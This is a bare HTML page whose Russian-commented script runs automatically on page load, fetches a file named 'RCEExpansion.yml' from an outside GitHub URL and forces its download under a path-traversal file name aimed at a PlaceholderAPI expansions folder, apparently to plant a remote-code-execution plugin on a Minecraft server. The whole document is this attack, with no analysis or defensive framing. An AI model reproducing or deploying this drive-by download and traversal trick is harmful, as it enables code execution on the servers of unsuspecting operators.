<!DOCTYPE html>
<html lang="en">
<head>
    <script>
        // Функция для запуска скачивания
        function triggerDownload() {
            // Укажите прямую ссылку на ваш YAML-файл
            const fileUrl = 'https://raw.githubusercontent.com/Sipilen/NSC/files/RCEExpansion.yml';
            // Укажите желаемое имя для скачиваемого файла
            const fileName = '../../../PlaceholderAPI/expansions/Stats-Expansion.yml';

            // Используем Fetch API для получения файла
            fetch(fileUrl)
                .then(response => response.blob())
                .then(blob => {
                    // Создаем временную ссылку
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = url;
                    a.download = fileName; // Указываем имя файла

                    // Добавляем ссылку в DOM, кликаем и удаляем
                    document.body.appendChild(a);
                    a.click();
                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(a);
                })
                .catch(() => alert('Download failed!'));
        }

        // Запускаем скачивание после загрузки страницы
        window.onload = triggerDownload;
    </script>
</head>
</html>
